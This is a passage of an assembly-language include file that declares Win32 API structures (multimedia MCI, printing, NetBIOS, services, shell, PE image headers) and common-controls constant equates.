.dwReserved2 RESD 1
.hmmio RESD 1
ENDSTRUC

STRUC MMCKINFO
.ckid RESD 1
.ckSize RESD 1
.fccType RESD 1
.dwDataOffset RESD 1
.dwFlags RESD 1
ENDSTRUC

STRUC MCI_GENERIC_PARMS
.dwCallback RESD 1
ENDSTRUC

STRUC MCI_OPEN_PARMS
.dwCallback RESD 1
.wDeviceID RESD 1
.lpstrDeviceType RESD 1
.lpstrElementName RESD 1
.lpstrAlias RESD 1
ENDSTRUC

STRUC MCI_PLAY_PARMS
.dwCallback RESD 1
.dwFrom RESD 1
.dwTo RESD 1
ENDSTRUC

STRUC MCI_SEEK_PARMS
.dwCallback RESD 1
.dwTo RESD 1
ENDSTRUC

STRUC MCI_STATUS_PARMS
.dwCallback RESD 1
.dwReturn RESD 1
.dwItem RESD 1
.dwTrack RESW 1
ENDSTRUC

STRUC MCI_INFO_PARMS
.dwCallback RESD 1
.lpstrReturn RESD 1
.dwRetSize RESD 1
ENDSTRUC

STRUC MCI_GETDEVCAPS_PARMS
.dwCallback RESD 1
.dwReturn RESD 1
.dwIten RESD 1
ENDSTRUC

STRUC MCI_SYSINFO_PARMS
.dwCallback RESD 1
.lpstrReturn RESD 1
.dwRetSize RESD 1
.dwNumber RESD 1
.wDeviceType RESD 1
ENDSTRUC

STRUC MCI_SET_PARMS
.dwCallback RESD 1
.dwTimeFormat RESD 1
.dwAudio RESD 1
ENDSTRUC

STRUC MCI_BREAK_PARMS
.dwCallback RESD 1
.nVirtKey RESD 1
.hwndBreak RESD 1
ENDSTRUC

STRUC MCI_SOUND_PARMS
.dwCallback RESD 1
.lpstrSoundName RESD 1
ENDSTRUC

STRUC MCI_SAVE_PARMS
.dwCallback RESD 1
.lpFileName RESD 1
ENDSTRUC

STRUC MCI_LOAD_PARMS
.dwCallback RESD 1
.lpFileName RESD 1
ENDSTRUC

STRUC MCI_RECORD_PARMS
.dwCallback RESD 1
.dwFrom RESD 1
.dwTo RESD 1
ENDSTRUC

STRUC MCI_VD_PLAY_PARMS
.dwCallback RESD 1
.dwFrom RESD 1
.dwTo RESD 1
.dwSpeed RESD 1
ENDSTRUC

STRUC MCI_VD_STEP_PARMS
.dwCallback RESD 1
.dwFrames RESD 1
ENDSTRUC

STRUC MCI_VD_ESCAPE_PARMS
.dwCallback RESD 1
.lpstrCommand RESD 1
ENDSTRUC

STRUC MCI_WAVE_OPEN_PARMS
.dwCallback RESD 1
.wDeviceID RESD 1
.lpstrDeviceType RESD 1
.lpstrElementName RESD 1
.lpstrAlias RESD 1
.dwBufferSeconds RESD 1
ENDSTRUC

STRUC MCI_WAVE_DELETE_PARMS
.dwCallback RESD 1
.dwFrom RESD 1
.dwTo RESD 1
ENDSTRUC

STRUC MCI_WAVE_SET_PARMS
.dwCallback RESD 1
.dwTimeFormat RESD 1
.dwAudio RESD 1
.wInput RESD 1
.wOutput RESD 1
.wFormatTag RESW 1
.wReserved2 RESW 1
.nChannels RESW 1
.wReserved3 RESW 1
.nSamplesPerSec RESD 1
.nAvgBytesPerSec RESD 1
.nBlockAlign RESW 1
.wReserved4 RESW 1
.wBitsPerSample RESW 1
.wReserved5 RESW 1
ENDSTRUC

STRUC MCI_SEQ_SET_PARMS
.dwCallback RESD 1
.dwTimeFormat RESD 1
.dwAudio RESD 1
.dwTempo RESD 1
.dwPort RESD 1
.dwSlave RESD 1
.dwMaster RESD 1
.dwOffset RESD 1
ENDSTRUC

STRUC MCI_ANIM_OPEN_PARMS
.dwCallback RESD 1
.wDeviceID RESD 1
.lpstrDeviceType RESD 1
.lpstrElementName RESD 1
.lpstrAlias RESD 1
.dwStyle RESD 1
.hWndParent RESD 1
ENDSTRUC

STRUC MCI_ANIM_PLAY_PARMS
.dwCallback RESD 1
.dwFrom RESD 1
.dwTo RESD 1
.dwSpeed RESD 1
ENDSTRUC

STRUC MCI_ANIM_STEP_PARMS
.dwCallback RESD 1
.dwFrames RESD 1
ENDSTRUC

STRUC MCI_ANIM_WINDOW_PARMS
.dwCallback RESD 1
.hwnd RESD 1
.nCmdShow RESD 1
.lpstrText RESD 1
ENDSTRUC

STRUC MCI_ANIM_RECT_PARMS
.dwCallback RESD 1
.rc RESB RECT_size
ENDSTRUC

STRUC MCI_ANIM_UPDATE_PARMS
.dwCallback RESD 1
.rc RESB RECT_size
.hDC RESD 1
ENDSTRUC

STRUC MCI_OVLY_OPEN_PARMS
.dwCallback RESD 1
.wDeviceID RESD 1
.lpstrDeviceType RESD 1
.lpstrElementName RESD 1
.lpstrAlias RESD 1
.dwStyle RESD 1
.hWndParent RESD 1
ENDSTRUC

STRUC MCI_OVLY_WINDOW_PARMS
.dwCallback RESD 1
.hwnd RESD 1
.nCmdShow RESD 1
.lpstrText RESD 1
ENDSTRUC

STRUC MCI_OVLY_RECT_PARMS
.dwCallback RESD 1
.rc RESB RECT_size
ENDSTRUC

STRUC MCI_OVLY_SAVE_PARMS
.dwCallback RESD 1
.lpFileName RESD 1
.rc RESB RECT_size
ENDSTRUC

STRUC MCI_OVLY_LOAD_PARMS
.dwCallback RESD 1
.lpFileName RESD 1
.rc RESB RECT_size
ENDSTRUC

STRUC PRINTER_INFO_1
.flags RESD 1
.pDescription RESD 1
.pName RESD 1
.pComment RESD 1
ENDSTRUC

STRUC PRINTER_INFO_2
.pServerName RESD 1
.pPrinterName RESD 1
.pShareName RESD 1
.pPortName RESD 1
.pDriverName RESD 1
.pComment RESD 1
.pLocation RESD 1
.pDevMode RESD 1
.pSepFile RESD 1
.pPrintProcessor RESD 1
.pDatatype RESD 1
.pParameters RESD 1
.pSecurityDescriptor RESD 1
.Attributes RESD 1
.Priority RESD 1
.DefaultPriority RESD 1
.StartTime RESD 1
.UntilTime RESD 1
.Status RESD 1
.cJobs RESD 1
.AveragePPM RESD 1
ENDSTRUC

STRUC PRINTER_INFO_3
.pSecurityDescriptor RESD 1
ENDSTRUC

STRUC JOB_INFO_1
.JobId RESD 1
.pPrinterName RESD 1
.pMachineName RESD 1
.pUserName RESD 1
.pDocument RESD 1
.pDatatype RESD 1
.pStatus RESD 1
.Status RESD 1
.Priority RESD 1
.Position RESD 1
.TotalPages RESD 1
.PagesPrinted RESD 1
.Submitted RESD 1
ENDSTRUC

STRUC JOB_INFO_2
.JobId RESD 1
.pPrinterName RESD 1
.pMachineName RESD 1
.pUserName RESD 1
.pDocument RESD 1
.pNotifyName RESD 1
.pDatatype RESD 1
.pPrintProcessor RESD 1
.pParameters RESD 1
.pDriverName RESD 1
.pDevMode RESD 1
.pStatus RESD 1
.pSecurityDescriptor RESD 1
.Status RESD 1
.Priority RESD 1
.Position RESD 1
.StartTime RESD 1
.UntilTime RESD 1
.TotalPages RESD 1
.isize RESD 1
.Submitted RESD 1
.time RESD 1
.PagesPrinted RESD 1
ENDSTRUC

STRUC ADDJOB_INFO_1
.Path RESD 1
.JobId RESD 1
ENDSTRUC

STRUC DRIVER_INFO_1
.pName RESD 1
ENDSTRUC

STRUC DRIVER_INFO_2
.cVersion RESD 1
.pName RESD 1
.pEnvironment RESD 1
.pDriverPath RESD 1
.pDataFile RESD 1
.pConfigFile RESD 1
ENDSTRUC

STRUC DOC_INFO_1
.pDocName RESD 1
.pOutputFile RESD 1
.pDatatype RESD 1
ENDSTRUC

STRUC FORM_INFO_1
.pName RESD 1
.isize RESD 1
.ImageableArea RESD 1
ENDSTRUC

STRUC PRINTPROCESSOR_INFO_1
.pName RESD 1
ENDSTRUC

STRUC PORT_INFO_1
.pName RESD 1
ENDSTRUC

STRUC MONITOR_INFO_1
.pName RESD 1
ENDSTRUC

STRUC MONITOR_INFO_2
.pName RESD 1
.pEnvironment RESD 1
.pDLLName RESD 1
ENDSTRUC

STRUC DATATYPES_INFO_1
.pName RESD 1
ENDSTRUC

STRUC PRINTER_DEFAULTS
.pDatatype RESD 1
.pDevMode RESD 1
.DesiredAccess RESD 1
ENDSTRUC

STRUC PRINTER_INFO_4
.pPrinterName RESD 1
.pServerName RESD 1
.Attributes RESD 1
ENDSTRUC

STRUC PRINTER_INFO_5
.pPrinterName RESD 1
.pPortName RESD 1
.Attributes RESD 1
.DeviceNotSelectedTimeout RESD 1
.TransmissionRetryTimeout RESD 1
ENDSTRUC

STRUC DRIVER_INFO_3
.cVersion RESD 1
.pName RESD 1
.pEnvironment RESD 1
.pDriverPath RESD 1
.pDataFile RESD 1
.pConfigFile RESD 1
.pHelpFile RESD 1
.pDependentFiles RESD 1
.pMonitorName RESD 1
.pDefaultDataType RESD 1
ENDSTRUC

STRUC DOC_INFO_2
.pDocName RESD 1
.pOutputFile RESD 1
.pDatatype RESD 1
.dwMode RESD 1
.JobId RESD 1
ENDSTRUC

STRUC PORT_INFO_2
.pPortName RESD 1
.pMonitorName RESD 1
.pDescription RESD 1
.fPortType RESD 1
.Reserved RESD 1
ENDSTRUC

STRUC PROVIDOR_INFO_1
.pName RESD 1
.pEnvironment RESD 1
.pDLLName RESD 1
ENDSTRUC

STRUC NETRESOURCE
.dwScope RESD 1
.dwType RESD 1
.dwDisplayType RESD 1
.dwUsage RESD 1
.lpLocalName RESD 1
.lpRemoteName RESD 1
.lpComment RESD 1
.lpProvider RESD 1
ENDSTRUC

STRUC NCB
.ncb_command RESW 1
.ncb_retcode RESW 1
.ncb_lsn RESW 1
.ncb_num RESW 1
.ncb_buffer RESD 1
.ncb_length RESW 1
.ncb_callname RESB NCBNAMSZ
.ncb_name RESB NCBNAMSZ
.ncb_rto RESW 1
.ncb_sto RESW 1
.ncb_post RESD 1
.ncb_lana_num RESW 1
.ncb_cmd_cplt RESW 1
.ncb_reserve10 RESB 1
.ncb_event RESD 1
ENDSTRUC

STRUC ADAPTER_STATUS
.adapter_address RESB 6
.rev_major RESW 1
.reserved0 RESW 1
.adapter_type RESW 1
.rev_minor RESW 1
.duration RESW 1
.frmr_recv RESW 1
.frmr_xmit RESW 1
.iframe_recv_err RESW 1
.xmit_aborts RESW 1
.xmit_success RESD 1
.recv_success RESD 1
.iframe_xmit_err RESW 1
.recv_buff_unavail RESW 1
.t1_timeouts RESW 1
.ti_timeouts RESW 1
.Reserved1 RESD 1
.free_ncbs RESW 1
.max_cfg_ncbs RESW 1
.max_ncbs RESW 1
.xmit_buf_unavail RESW 1
.max_dgram_isize RESW 1
.pending_sess RESW 1
.max_cfg_sess RESW 1
.max_sess RESW 1
.max_sess_pkt_isize RESW 1
.name_count RESW 1
ENDSTRUC

STRUC NAME_BUFFER
.xname RESB NCBNAMSZ
.name_num RESW 1
.name_flags RESW 1
ENDSTRUC

STRUC SESSION_HEADER
.sess_name RESW 1
.num_sess RESW 1
.rcv_dg_outstanding RESW 1
.rcv_any_outstanding RESW 1
ENDSTRUC

STRUC SESSION_BUFFER
.lsn RESW 1
.State RESW 1
.local_name RESB NCBNAMSZ
.remote_name RESB NCBNAMSZ
.rcvs_outstanding RESW 1
.sends_outstanding RESW 1
ENDSTRUC

STRUC LANA_ENUM
.iLength RESW 1
.lana RESW 1
ENDSTRUC

STRUC FIND_NAME_HEADER
.node_count RESW 1
.Reserved RESW 1
.unique_group RESW 1
ENDSTRUC

STRUC FIND_NAME_BUFFER
.iLength RESW 1
.access_control RESW 1
.frame_control RESW 1
.destination_addr RESW 1
.source_addr RESW 1
.routing_info RESW 1
ENDSTRUC

STRUC ACTION_HEADER
.transport_id RESD 1
.action_code RESW 1
.Reserved RESW 1
ENDSTRUC

STRUC CRGB
.bRed RESB 1
.bGreen RESB 1
.bBlue RESB 1
.bExtra RESB 1
ENDSTRUC

STRUC SERVICE_STATUS
.dwServiceType RESD 1
.dwCurrentState RESD 1
.dwControlsAccepted RESD 1
.dwWin32ExitCode RESD 1
.dwServiceSpecificExitCode RESD 1
.dwCheckPoint RESD 1
.dwWaitHint RESD 1
ENDSTRUC

STRUC ENUM_SERVICE_STATUS
.lpServiceName RESD 1
.lpDisplayName RESD 1
.ServiceStatus RESD 1
ENDSTRUC

STRUC QUERY_SERVICE_LOCK_STATUS
.fIsLocked RESD 1
.lpLockOwner RESD 1
.dwLockDuration RESD 1
ENDSTRUC

STRUC QUERY_SERVICE_CONFIG
.dwServiceType RESD 1
.dwStartType RESD 1
.dwErrorControl RESD 1
.lpBinaryPathName RESD 1
.lpLoadOrderGroup RESD 1
.dwTagId RESD 1
.lpDependencies RESD 1
.lpServiceStartName RESD 1
.lpDisplayName RESD 1
ENDSTRUC

STRUC SERVICE_TABLE_ENTRY
.lpServiceName RESD 1
.lpServiceProc RESD 1
ENDSTRUC

STRUC LARGE_INTEGER
.lowpart RESD 1
.highpart RESD 1
ENDSTRUC

STRUC PERF_DATA_BLOCK
.Signature RESB 4
.LittleEndian RESD 1
.Version RESD 1
.Revision RESD 1
.TotalByteiLength RESD 1
.HeaderiLength RESD 1
.NumObjectTypes RESD 1
.DefaultObject RESD 1
.SystemTime RESD 1
.PerfTime RESD 1
.PerfFreq RESD 1
.PerTime100nSec RESD 1
.SystemNameiLength RESD 1
.SystemNameOffset RESD 1
ENDSTRUC

STRUC PERF_OBJECT_TYPE
.TotalByteiLength RESD 1
.DefinitioniLength RESD 1
.HeaderiLength RESD 1
.ObjectNameTitleIndex RESD 1
.ObjectNameTitle RESD 1
.ObjectHelpTitleIndex RESD 1
.ObjectHelpTitle RESD 1
.DetailLevel RESD 1
.NumCounters RESD 1
.DefaultCounter RESD 1
.NumInstances RESD 1
.CodePage RESD 1
.PerfTime RESD 1
.PerfFreq RESD 1
ENDSTRUC

STRUC PERF_COUNTER_DEFINITION
.ByteiLength RESD 1
.CounterNameTitleIndex RESD 1
.CounterNameTitle RESD 1
.CounterHelpTitleIndex RESD 1
.CounterHelpTitle RESD 1
.DefaultScale RESD 1
.DetailLevel RESD 1
.CounterType RESD 1
.CounterSize RESD 1
.CounterOffset RESD 1
ENDSTRUC

STRUC PERF_INSTANCE_DEFINITION
.ByteiLength RESD 1
.ParentObjectTitleIndex RESD 1
.ParentObjectInstance RESD 1
.UniqueID RESD 1
.NameOffset RESD 1
.NameiLength RESD 1
ENDSTRUC

STRUC PERF_COUNTER_BLOCK
.ByteiLength RESD 1
ENDSTRUC

STRUC COMPOSITIONFORM
.dwStyle RESD 1
.ptCurrentPos RESB POINT_size
.rcArea RESB RECT_size
ENDSTRUC

STRUC CANDIDATEFORM
.dwIndex RESD 1
.dwStyle RESD 1
.ptCurrentPos RESB POINT_size
.rcArea RESB RECT_size
ENDSTRUC

STRUC CANDIDATELIST
.dwSize RESD 1
.dwStyle RESD 1
.dwCount RESD 1
.dwSelection RESD 1
.dwPageStart RESD 1
.dwPageSize RESD 1
.dwOffset1 RESD 1
ENDSTRUC

STRUC STYLEBUF
.dwStyle RESD 1
.szDescription RESB STYLE_DESCRIPTION_SIZE
ENDSTRUC

STRUC MODEMDEVCAPS
.dwActualSize RESD 1
.dwRequiredSize RESD 1
.dwDevSpecificOffset RESD 1
.dwDevSpecificSize RESD 1
.dwModemProviderVersion RESD 1
.dwModemManufacturerOffset RESD 1
.dwModemManufacturerSize RESD 1
.dwModemModelOffset RESD 1
.dwModemModelSize RESD 1
.dwModemVersionOffset RESD 1
.dwModemVersionSize RESD 1
.dwDialOptions RESD 1
.dwCallSetupFailTimer RESD 1
.dwInactivityTimeout RESD 1
.dwSpeakerVolume RESD 1
.dwSpeakerMode RESD 1
.dwModemOptions RESD 1
.dwMaxDTERate RESD 1
.dwMaxDCERate RESD 1
.abVariablePortion RESB 1
ENDSTRUC

STRUC MODEMSETTINGS
.dwActualSize RESD 1
.dwRequiredSize RESD 1
.dwDevSpecificOffset RESD 1
.dwDevSpecificSize RESD 1
.dwCallSetupFailTimer RESD 1
.dwInactivityTimeout RESD 1
.dwSpeakerVolume RESD 1
.dwSpeakerMode RESD 1
.dwPreferredModemOptions RESD 1
.dwNegotiatedModemOptions RESD 1
.dwNegotiatedDCERate RESD 1
.abVariablePortion RESB 1
ENDSTRUC

STRUC DRAGINFO
.uSize RESD 1
.pt RESB POINT_size
.fNC RESD 1
.lpFileList RESD 1
.grfKeyState RESD 1
ENDSTRUC

STRUC APPBARDATA
.cbSize RESD 1
.hwnd RESD 1
.uCallbackMessage RESD 1
.uEdge RESD 1
.rc RESB RECT_size
.lParam RESD 1
ENDSTRUC

STRUC SHFILEOPSTRUCT
.hwnd RESD 1
.wFunc RESD 1
.pFrom RESD 1
.pTo RESD 1
.fFlags RESW 1
.fAnyOperationsAborted RESD 1
.hNameMappings RESD 1
.lpszProgressTitle RESD 1
ENDSTRUC

STRUC SHNAMEMAPPING
.pszOldPath RESD 1
.pszNewPath RESD 1
.cchOldPath RESD 1
.cchNewPath RESD 1
ENDSTRUC

STRUC SHELLEXECUTEINFO
.cbSize RESD 1
.fMask RESD 1
.hwnd RESD 1
.lpVerb RESD 1
.lpFile RESD 1
.lpParameters RESD 1
.lpDirectory RESD 1
.nShow RESD 1
.hInstApp RESD 1
.lpIDList RESD 1
.lpClass RESD 1
.hkeyClass RESD 1
.dwHotKey RESD 1
.hIcon RESD 1
.hProcess RESD 1
ENDSTRUC

STRUC NOTIFYICONDATA
.cbSize RESD 1
.hwnd RESD 1
.uID RESD 1
.uFlags RESD 1
.uCallbackMessage RESD 1
.hIcon RESD 1
.szTip RESB 64
ENDSTRUC

STRUC SHFILEINFO
.hIcon RESD 1
.iIcon RESD 1
.dwAttributes RESD 1
.szDisplayName RESB 1
.szTypeName RESB 80 
ENDSTRUC

STRUC VS_FIXEDFILEINFO
.dwSignature RESD 1
.dwStrucVersion RESD 1
.dwFileVersionMS RESD 1
.dwFileVersionLS RESD 1
.dwProductVersionMS RESD 1
.dwProductVersionLS RESD 1
.dwFileFlagsMask RESD 1
.dwFileFlags RESD 1
.dwFileOS RESD 1
.dwFileType RESD 1
.dwFileSubtype RESD 1
.dwFileDateMS RESD 1
.dwFileDateLS RESD 1
ENDSTRUC

STRUC ICONMETRICS
.cbSize RESD 1
.iHorzSpacing RESD 1
.iVertSpacing RESD 1
.iTitleWrap RESD 1
.lfFont RESD 1
ENDSTRUC

STRUC HELPINFO
.cbSize RESD 1
.iContextType RESD 1
.iCtrlId RESD 1
.hItemHandle RESD 1
.dwContextId RESD 1
.MousePos RESD 1
ENDSTRUC

STRUC ANIMATIONINFO
.cbSize RESD 1
.iMinAnimate RESD 1
ENDSTRUC

STRUC MINIMIZEDMETRICS
.cbSize RESD 1
.iWidth RESD 1
.iHorzGap RESD 1
.iVertGap RESD 1
.iArrange RESD 1
.lfFont RESD 1
ENDSTRUC

STRUC OSVERSIONINFO
.dwOSVersionInfoSize RESD 1
.dwMajorVersion RESD 1
.dwMinorVersion RESD 1
.dwBuildNumber RESD 1
.dwPlatformId RESD 1
.szCSDVersion RESB 128
ENDSTRUC

STRUC SYSTEM_POWER_STATUS
.ACLineStatus RESB 1
.BatteryFlag RESB 1
.BatteryLifePercent RESB 1
.Reserved1 RESB 1
.BatteryLifeTime RESD 1
.BatteryFullLifeTime RESD 1
ENDSTRUC

STRUC NMHDR
.hwndFrom RESD 1
.idfrom RESD 1
.code RESD 1
ENDSTRUC

STRUC DEVNAMES
.wDriverOffset RESW 1
.wDeviceOffset RESW 1
.wOutputOffset RESW 1
.wDefault RESW 1
ENDSTRUC

STRUC PAGESETUPDLGAPI
.lStructSize RESD 1
.hwndOwner RESD 1
.hDevMode RESD 1
.hDevNames RESD 1
.flags RESD 1
.ptPaperSize RESB POINT_size
.rtMinMargin RESD 1
.rtMargin RESD 1
.hInstance RESD 1
.lCustData RESD 1
.lpfnPageSetupHook RESD 1
.lpfnPagePaintHook RESD 1
.lpPageSetupTemplateName RESD 1
.hPageSetupTemplate RESD 1
ENDSTRUC

STRUC COMMCONFIG
.dwSize RESD 1
.wVersion RESW 1
.wReserved RESW 1
.dcbx RESD 1
.dwProviderSubType RESD 1
.dwProviderOffset RESD 1
.dwProviderSize RESD 1
.wcProviderData RESB 1
ENDSTRUC

STRUC PIXELFORMATDESCRIPTOR
.nSize RESW 1
.nVersion RESW 1
.dwFlags RESD 1
.iPixelType RESB 1
.cColorBits RESB 1
.cRedBits RESB 1
.cRedShift RESB 1
.cGreenBits RESB 1
.cGreenShift RESB 1
.cBlueBits RESB 1
.cBlueShift RESB 1
.cAlphaBits RESB 1
.cAlphaShift RESB 1
.cAccumBits RESB 1
.cAccumRedBits RESB 1
.cAccumGreenBits RESB 1
.cAccumBlueBits RESB 1
.cAccumAlphaBits RESB 1
.cDepthBits RESB 1
.cStencilBits RESB 1
.cAuxBuffers RESB 1
.iLayerType RESB 1
.bReserved RESB 1
.dwLayerMask RESD 1
.dwVisibleMask RESD 1
.dwDamageMask RESD 1
ENDSTRUC

STRUC DRAWTEXTPARAMS
.cbSize RESD 1
.iTabiLength RESD 1
.iLeftMargin RESD 1
.iRightMargin RESD 1
.uiiLengthDrawn RESD 1
ENDSTRUC

STRUC MENUITEMINFO
.cbSize RESD 1
.fMask RESD 1
.fType RESD 1
.fState RESD 1
.wID RESD 1
.hSubMenu RESD 1
.hbmpChecked RESD 1
.hbmpUnchecked RESD 1
.dwItemData RESD 1
.dwTypeData RESD 1
.cch RESD 1
ENDSTRUC

STRUC SCROLLINFO
.cbSize RESD 1
.fMask RESD 1
.nMin RESD 1
.nMax RESD 1
.nPage RESD 1
.nPos RESD 1
.nTrackPos RESD 1
ENDSTRUC

STRUC MSGBOXPARAMS
.cbSize RESD 1
.hwndOwner RESD 1
.hInstance RESD 1
.lpszText RESD 1
.lpszCaption RESD 1
.dwStyle RESD 1
.lpszIcon RESD 1
.dwContextHelpId RESD 1
.lpfnMsgBoxCallback RESD 1
.dwLanguageId RESD 1
ENDSTRUC

STRUC DEBUG_EVENT
.dwDebugEventCode RESD 1
.dwProcessId RESD 1
.dwThreadId RESD 1
.u RESD 1
ENDSTRUC

STRUC COLORMAP
.cmFrom RESD 1
.cmTo RESD 1
ENDSTRUC

STRUC AuxVol
.vLow RESW 1
.vHigh RESW 1
ENDSTRUC

STRUC DBGTHREAD
.hThread RESD 1
.lpStartAddress RESD 1
.bfState RESD 1
.nNext RESQ 1
ENDSTRUC

STRUC DbgProcess
.hDbgHeap RESD 1
.dwProcessID RESD 1
.dwThreadID RESD 1
.hProcess RESD 1
.hFile RESD 1
.lpImage RESD 1
ENDSTRUC

STRUC IMAGE_DATA_DIRECTORY
.VirtualAddress RESD 1
.isize RESD 1
ENDSTRUC

STRUC IMAGE_OPTIONAL_HEADER
.Magic RESW 1
.MajorLinkerVersion RESB 1
.MinorLinkerVersion RESB 1
.SizeOfCode RESD 1
.SizeOfInitializedData RESD 1
.SizeOfUninitializedData RESD 1
.AddressOfEntryPoint RESD 1
.BaseOfCode RESD 1
.BaseOfData RESD 1
.ImageBase RESD 1
.SectionAlignment RESD 1
.FileAlignment RESD 1
.MajorOperatingSystemVersion RESW 1
.MinorOperatingSystemVersion RESW 1
.MajorImageVersion RESW 1
.MinorImageVersion RESW 1
.MajorSubsystemVersion RESW 1
.MinorSubsystemVersion RESW 1
.Reserved1 RESD 1
.SizeOfImage RESD 1
.SizeOfHeaders RESD 1
.CheckSum RESD 1
.Subsystem RESW 1
.DllCharacteristics RESW 1
.SizeOfStackReserve RESD 1
.SizeOfStackCommit RESD 1
.SizeOfHeapReserve RESD 1
.SizeOfHeapCommit RESD 1
.LoaderFlags RESD 1
.NumberOfRvaAndSizes RESD 1
.DataDirectory RESQ 1
ENDSTRUC

STRUC IMAGE_FILE_HEADER
.Machine RESW 1
.NumberOfSections RESW 1
.TimeDateStamp RESD 1
.PointerToSymbolTable RESD 1
.NumberOfSymbols RESD 1
.SizeOfOptionalHeader RESW 1
.Characteristics RESW 1
ENDSTRUC

STRUC IMAGE_NT_HEADERS
.Signature RESD 1
.FileHeader RESD 1
.OptionalHeader RESD 1
ENDSTRUC

STRUC IMAGE_EXPORT_DIRECTORY
.Characteristics RESD 1
.TimeDateStamp RESD 1
.MajorVersion RESW 1
.MinorVersion RESW 1
.nName RESD 1
.nBase RESD 1
.NumberOfFunctions RESD 1
.NumberOfNames RESD 1
.AddressOfFunctions RESD 1
.AddressOfNames RESD 1
.AddressOfNameOrdinals RESW 1
ENDSTRUC

STRUC IMAGE_DOS_HEADER
.e_magic RESW 1
.e_cblp RESW 1
.e_cp RESW 1
.e_crlc RESW 1
.e_cparhdr RESW 1
.e_minalloc RESW 1
.e_maxalloc RESW 1
.e_ss RESW 1
.e_sp RESW 1
.e_csum RESW 1
.e_ip RESW 1
.e_cs RESW 1
.e_lfarlc RESW 1
.e_ovno RESW 1
.e_res4 RESW 1
.e_oemid RESW 1
.e_oeminfo RESW 1
.e_res2 RESW 1
.e_lfanew RESD 1
ENDSTRUC

STRUC USER_INFO_3
.uName RESD 1
.Password RESD 1
.PasswordAge RESD 1
.Privilege RESD 1
.HomeDir RESD 1
.Comment RESD 1
.Flags RESD 1
.ScriptPath RESD 1
.AuthFlags RESD 1
.FullName RESD 1
.UserComment RESD 1
.Parms RESD 1
.Workstations RESD 1
.LastLogon RESD 1
.LastLogoff RESD 1
.AcctExpires RESD 1
.MaxStorage RESD 1
.UnitsPerWeek RESD 1
.LogonHours RESD 1
.BadPwCount RESD 1
.NumLogons RESD 1
.LogonServer RESD 1
.CountryCode RESD 1
.CodePage RESD 1
.UserID RESD 1
.PrimaryGroupID RESD 1
.Profile RESD 1
.HomeDirDrive RESD 1
.PasswordExpired RESD 1
ENDSTRUC

STRUC GROUP_INFO_2
.uName RESD 1
.Comment RESD 1
.GroupID RESD 1
.Attributes RESD 1
ENDSTRUC

;---------------------------comctl equates-------------------------------
ODT_HEADER equ 100
ODT_TAB equ 101
ODT_LISTVIEW equ 102
LVM_FIRST equ 1000h
TV_FIRST equ 1100h
HDM_FIRST equ 1200h
NM_OUTOFMEMORY equ NM_FIRST-1
NM_CLICK equ NM_FIRST-2
NM_DBLCLK equ NM_FIRST-3
NM_RETURN equ NM_FIRST-4
NM_RCLICK equ NM_FIRST-5
NM_RDBLCLK equ NM_FIRST-6
NM_SETFOCUS equ NM_FIRST-7
NM_KILLFOCUS equ NM_FIRST-8
CCS_TOP equ 00000001h
CCS_NOMOVEY equ 00000002h
CCS_BOTTOM equ 00000003h
CCS_NORESIZE equ 00000004h
CCS_NOPARENTALIGN equ 00000008h
CCS_ADJUSTABLE equ 00000020h
CCS_NODIVIDER equ 00000040h
CCM_FIRST equ 2000h
CCM_SETBKCOLOR equ CCM_FIRST+1
CCM_SETCOLORSCHEME equ CCM_FIRST+2
CCM_GETCOLORSCHEME equ CCM_FIRST+3
CCM_GETDROPTARGET equ CCM_FIRST+4
CCM_SETUNICODEFORMAT equ CCM_FIRST+5
CCM_GETUNICODEFORMAT equ CCM_FIRST+6
LVN_FIRST equ 0-100
LVN_LAST equ 0-199
HDN_FIRST equ 0-300
HDN_LAST equ 0-399
TVN_FIRST equ 0-400
TVN_LAST equ 0-499
TTN_FIRST equ 0-520
TTN_LAST equ 0-549
TCN_FIRST equ 0-550
TCN_LAST equ 0-580
CDN_FIRST equ 0-601
CDN_LAST equ 0-699
TBN_FIRST equ 0-700
TBN_LAST equ 0-720
UDN_FIRST equ 0-721
UDN_LAST equ 0-740
MCN_FIRST equ 0-750
MCN_LAST equ 0-759
DTN_FIRST equ 0-760
DTN_LAST equ 0-799
CBEN_FIRST equ 0-800
CBEN_LAST equ 0-830
RBN_FIRST equ 0-831
RBN_LAST equ 0-859
IPN_FIRST equ 0-860
IPN_LAST equ 0-879
SBN_FIRST equ 0-880
SBN_LAST equ 0-899
PGN_FIRST equ 0-900
PGN_LAST equ 0-950
MSGF_COMMCTRL_BEGINDRAG equ 4200h
MSGF_COMMCTRL_SIZEHEADER equ 4201h
MSGF_COMMCTRL_DRAGSELECT equ 4202h
MSGF_COMMCTRL_TOOLBARCUST equ 4203h
ICC_LISTVIEW_CLASSES equ 00000001h
ICC_TREEVIEW_CLASSES equ 00000002h
ICC_BAR_CLASSES equ 00000004h
ICC_TAB_CLASSES equ 00000008h
ICC_UPDOWN_CLASS equ 00000010h
ICC_PROGRESS_CLASS equ 00000020h
ICC_HOTKEY_CLASS equ 00000040h
ICC_ANIMATE_CLASS equ 00000080h
ICC_WIN95_CLASSES equ 000000FFh
ICC_DATE_CLASSES equ 00000100h
ICC_USEREX_CLASSES equ 00000200h
ICC_COOL_CLASSES equ 00000400h
ICC_INTERNET_CLASSES equ 00000800h
ICC_PAGESCROLLER_CLASS equ 00001000h
ICC_NATIVEFNTCTL_CLASS equ 00002000h
RBIM_IMAGELIST equ 00000001h
RBS_TOOLTIPS equ 0100h
RBS_VARHEIGHT equ 0200h
RBS_BANDBORDERS equ 0400h
RBS_FIXEDORDER equ 0800h
RBS_REGISTERDROP equ 1000h
RBS_AUTOSIZE equ 2000h
RBS_VERTICALGRIPPER equ 4000h
RBS_DBLCLKTOGGLE equ 8000h
RBBS_BREAK equ 00000001h
RBBS_FIXEDSIZE equ 00000002h
RBBS_CHILDEDGE equ 00000004h
RBBS_HIDDEN equ 00000008h
RBBS_NOVERT equ 00000010h
RBBS_FIXEDBMP equ 00000020h
RBBS_VARIABLEHEIGHT equ 00000040h
RBBS_GRIPPERALWAYS equ 00000080h
RBBS_NOGRIPPER equ 00000100h
RBBIM_STYLE equ 00000001h
RBBIM_COLORS equ 00000002h
RBBIM_TEXT equ 00000004h
RBBIM_IMAGE equ 00000008h
RBBIM_CHILD equ 00000010h
RBBIM_CHILDSIZE equ 00000020h
RBBIM_SIZE equ 00000040h
RBBIM_BACKGROUND equ 00000080h
RBBIM_ID equ 00000100h
RBBIM_IDEALSIZE equ 00000200h
RBBIM_LPARAM equ 00000400h
RBBIM_HEADERSIZE equ 00000800h
RB_INSERTBAND equ WM_USER+1
RB_DELETEBAND equ WM_USER+2
RB_GETBARINFO equ WM_USER+3
